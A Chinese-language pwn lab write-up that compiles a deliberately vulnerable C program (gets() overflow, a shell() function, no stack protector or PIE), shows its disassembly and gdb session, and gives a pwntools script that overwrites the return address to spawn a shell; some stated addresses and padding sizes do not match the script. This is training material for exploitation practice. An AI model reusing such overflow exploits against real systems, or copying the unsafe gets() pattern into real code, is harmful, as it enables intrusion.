# pwn writeup

[TOC]

# 資源
* demo.c
```c=
#include<stdio.h>
#include<unistd.h>

void shell(){
    system("/bin/bash");
}
void vuln(){
    char buf[10];
    gets(buf);
}
int main(){
    vuln();
}
```

進行編譯 `gcc -fno-stack-protector demo.c -o demo -no-pie`

# 工具
* objdjump
* gdb
* gef

# 解題

## 觀察source code
可以看到main function呼叫vuln()，使用到了gets()函式，是有BOF。而且還有個shell()可以利用。

* `objdump -M intel -d demo`
:::spoiler 檔案
demo:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64
  401004:       48 83 ec 08             sub    rsp,0x8
  401008:       48 8b 05 e9 2f 00 00    mov    rax,QWORD PTR [rip+0x2fe9]        \# 403ff8 <__gmon_start__>
  40100f:       48 85 c0                test   rax,rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   rax
  401016:       48 83 c4 08             add    rsp,0x8
  40101a:       c3                      ret

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 e2 2f 00 00       push   QWORD PTR [rip+0x2fe2]        \# 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 e3 2f 00 00    bnd jmp QWORD PTR [rip+0x2fe3]        \# 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nop    DWORD PTR [rax]
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <.plt>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <.plt>
  40104f:       90                      nop

Disassembly of section .plt.sec:

0000000000401050 <system@plt>:
  401050:       f3 0f 1e fa             endbr64
  401054:       f2 ff 25 bd 2f 00 00    bnd jmp QWORD PTR [rip+0x2fbd]        \# 404018 <system@GLIBC_2.2.5>
  40105b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

0000000000401060 <gets@plt>:
  401060:       f3 0f 1e fa             endbr64
  401064:       f2 ff 25 b5 2f 00 00    bnd jmp QWORD PTR [rip+0x2fb5]        \# 404020 <gets@GLIBC_2.2.5>
  40106b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401070 <_start>:
  401070:       f3 0f 1e fa             endbr64
  401074:       31 ed                   xor    ebp,ebp
  401076:       49 89 d1                mov    r9,rdx
  401079:       5e                      pop    rsi
  40107a:       48 89 e2                mov    rdx,rsp
  40107d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
  401081:       50                      push   rax
  401082:       54                      push   rsp
  401083:       49 c7 c0 20 12 40 00    mov    r8,0x401220
  40108a:       48 c7 c1 b0 11 40 00    mov    rcx,0x4011b0
  401091:       48 c7 c7 92 11 40 00    mov    rdi,0x401192
  401098:       ff 15 52 2f 00 00       call   QWORD PTR [rip+0x2f52]        \# 403ff0 <__libc_start_main@GLIBC_2.2.5>
  40109e:       f4                      hlt
  40109f:       90                      nop

00000000004010a0 <_dl_relocate_static_pie>:
  4010a0:       f3 0f 1e fa             endbr64
  4010a4:       c3                      ret
  4010a5:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  4010ac:       00 00 00
  4010af:       90                      nop

00000000004010b0 <deregister_tm_clones>:
  4010b0:       b8 38 40 40 00          mov    eax,0x404038
  4010b5:       48 3d 38 40 40 00       cmp    rax,0x404038
  4010bb:       74 13                   je     4010d0 <deregister_tm_clones+0x20>
  4010bd:       b8 00 00 00 00          mov    eax,0x0
  4010c2:       48 85 c0                test   rax,rax
  4010c5:       74 09                   je     4010d0 <deregister_tm_clones+0x20>
  4010c7:       bf 38 40 40 00          mov    edi,0x404038
  4010cc:       ff e0                   jmp    rax
  4010ce:       66 90                   xchg   ax,ax
  4010d0:       c3                      ret
  4010d1:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4010d8:       00 00 00 00
  4010dc:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

00000000004010e0 <register_tm_clones>:
  4010e0:       be 38 40 40 00          mov    esi,0x404038
  4010e5:       48 81 ee 38 40 40 00    sub    rsi,0x404038
  4010ec:       48 89 f0                mov    rax,rsi
  4010ef:       48 c1 ee 3f             shr    rsi,0x3f
  4010f3:       48 c1 f8 03             sar    rax,0x3
  4010f7:       48 01 c6                add    rsi,rax
  4010fa:       48 d1 fe                sar    rsi,1
  4010fd:       74 11                   je     401110 <register_tm_clones+0x30>
  4010ff:       b8 00 00 00 00          mov    eax,0x0
  401104:       48 85 c0                test   rax,rax
  401107:       74 07                   je     401110 <register_tm_clones+0x30>
  401109:       bf 38 40 40 00          mov    edi,0x404038
  40110e:       ff e0                   jmp    rax
  401110:       c3                      ret
  401111:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401118:       00 00 00 00
  40111c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401120 <__do_global_dtors_aux>:
  401120:       f3 0f 1e fa             endbr64
  401124:       80 3d 0d 2f 00 00 00    cmp    BYTE PTR [rip+0x2f0d],0x0        \# 404038 <__TMC_END__>
  40112b:       75 13                   jne    401140 <__do_global_dtors_aux+0x20>
  40112d:       55                      push   rbp
  40112e:       48 89 e5                mov    rbp,rsp
  401131:       e8 7a ff ff ff          call   4010b0 <deregister_tm_clones>
  401136:       c6 05 fb 2e 00 00 01    mov    BYTE PTR [rip+0x2efb],0x1        \# 404038 <__TMC_END__>
  40113d:       5d                      pop    rbp
  40113e:       c3                      ret
  40113f:       90                      nop
  401140:       c3                      ret
  401141:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401148:       00 00 00 00
  40114c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000401150 <frame_dummy>:
  401150:       f3 0f 1e fa             endbr64
  401154:       eb 8a                   jmp    4010e0 <register_tm_clones>

0000000000401156 <shell>:
  401156:       f3 0f 1e fa             endbr64
  40115a:       55                      push   rbp
  40115b:       48 89 e5                mov    rbp,rsp
  40115e:       48 8d 3d 9f 0e 00 00    lea    rdi,[rip+0xe9f]        # 402004 <_IO_stdin_used+0x4>
  401165:       b8 00 00 00 00          mov    eax,0x0
  40116a:       e8 e1 fe ff ff          call   401050 <system@plt>
  40116f:       90                      nop
  401170:       5d                      pop    rbp
  401171:       c3                      ret

0000000000401172 <vuln>:
  401172:       f3 0f 1e fa             endbr64
  401176:       55                      push   rbp
  401177:       48 89 e5                mov    rbp,rsp
  40117a:       48 83 ec 10             sub    rsp,0x10
  40117e:       48 8d 45 f6             lea    rax,[rbp-0xa]
  401182:       48 89 c7                mov    rdi,rax
  401185:       b8 00 00 00 00          mov    eax,0x0
  40118a:       e8 d1 fe ff ff          call   401060 <gets@plt>
  40118f:       90                      nop
  401190:       c9                      leave
  401191:       c3                      ret

0000000000401192 <main>:
  401192:       f3 0f 1e fa             endbr64
  401196:       55                      push   rbp
  401197:       48 89 e5                mov    rbp,rsp
  40119a:       b8 00 00 00 00          mov    eax,0x0
  40119f:       e8 ce ff ff ff          call   401172 <vuln>
  4011a4:       b8 00 00 00 00          mov    eax,0x0
  4011a9:       5d                      pop    rbp
  4011aa:       c3                      ret
  4011ab:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]

00000000004011b0 <__libc_csu_init>:
  4011b0:       f3 0f 1e fa             endbr64
  4011b4:       41 57                   push   r15
  4011b6:       4c 8d 3d 53 2c 00 00    lea    r15,[rip+0x2c53]        # 403e10 <__frame_dummy_init_array_entry>
  4011bd:       41 56                   push   r14
  4011bf:       49 89 d6                mov    r14,rdx
  4011c2:       41 55                   push   r13
  4011c4:       49 89 f5                mov    r13,rsi
  4011c7:       41 54                   push   r12
  4011c9:       41 89 fc                mov    r12d,edi
  4011cc:       55                      push   rbp
  4011cd:       48 8d 2d 44 2c 00 00    lea    rbp,[rip+0x2c44]        # 403e18 <__do_global_dtors_aux_fini_array_entry>
  4011d4:       53                      push   rbx
  4011d5:       4c 29 fd                sub    rbp,r15
  4011d8:       48 83 ec 08             sub    rsp,0x8
  4011dc:       e8 1f fe ff ff          call   401000 <_init>
  4011e1:       48 c1 fd 03             sar    rbp,0x3
  4011e5:       74 1f                   je     401206 <__libc_csu_init+0x56>
  4011e7:       31 db                   xor    ebx,ebx
  4011e9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
  4011f0:       4c 89 f2                mov    rdx,r14
  4011f3:       4c 89 ee                mov    rsi,r13
  4011f6:       44 89 e7                mov    edi,r12d
  4011f9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4011fd:       48 83 c3 01             add    rbx,0x1
  401201:       48 39 dd                cmp    rbp,rbx
  401204:       75 ea                   jne    4011f0 <__libc_csu_init+0x40>
  401206:       48 83 c4 08             add    rsp,0x8
  40120a:       5b                      pop    rbx
  40120b:       5d                      pop    rbp
  40120c:       41 5c                   pop    r12
  40120e:       41 5d                   pop    r13
  401210:       41 5e                   pop    r14
  401212:       41 5f                   pop    r15
  401214:       c3                      ret
  401215:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
  40121c:       00 00 00 00

0000000000401220 <__libc_csu_fini>:
  401220:       f3 0f 1e fa             endbr64
  401224:       c3                      ret

Disassembly of section .fini:

0000000000401228 <_fini>:
  401228:       f3 0f 1e fa             endbr64
  40122c:       48 83 ec 08             sub    rsp,0x8
  401230:       48 83 c4 08             add    rsp,0x8
  401234:       c3                      ret

:::
    
![](https://i.imgur.com/Wcs23Xk.png)

shell()位於0x401156，如上圖
    
* `gdb demo`
    
* b main

* r (執行)





![](https://i.imgur.com/syk75vo.png)

看了一下stack和asm code，vuln()最後會`mov $rsp, $rbp`，$rsp會指向$rbp`400`，之後`pop $rbp` `pop $rsp`，$rsp會拿到408的值，目前是`<main+30> mov eax, 0x0`，也就是return address，是我們要蓋掉的。
![](https://i.imgur.com/friADMa.png)
    
## 寫 exp.py
`vim exp.py`
    
```python=
#!/usr/bin/env python3
from pwn import *

p = process('./demo')
pause()
payload  = b'a'*10
payload += p64(0)                # p64() 用8bytes進行包裝
payload += p64(0x40117e)
payload += b"\n"

p.send(payload)
print(payload)
#offset=b'a'*0x18
#p.sendline(offset.decode('utf8')+payload.decode('utf8'))
p.interactive()
```
    
* 選擇shell的address`0x40117e`
![](https://i.imgur.com/ZfqxMt7.png)

## 執行
    
* `python3 exp.py`
![](https://i.imgur.com/B3Q5Xh3.png)

* `gdb -p $(pidof demo)`
用gdb動態追蹤現在正在執行的demo
![](https://i.imgur.com/AZtDBaS.png)
可以看到現在程式停在`read`，因為exp.py有設個`pause()`，在等我輸入
* `disas vuln`
![](https://i.imgur.com/8XezK6T.png)
找個可以斷點的位址進行檢查
* `b *0x00000000004011bb`
![](https://i.imgur.com/YQKSK6e.png)

* `c`
![](https://i.imgur.com/KQoZOiO.png)

* `exp.py`點擊任意鍵以輸入payload
![](https://i.imgur.com/K4K9fBM.png)

![](https://i.imgur.com/kGgOSkI.png)
可以看到前段先被塞了10個a、10個0，最後再塞入shell的address進行overflow
    
* `c`
![](https://i.imgur.com/ommesQC.png)
回傳shell
    
    

###### tags: `資安中心` `pwn`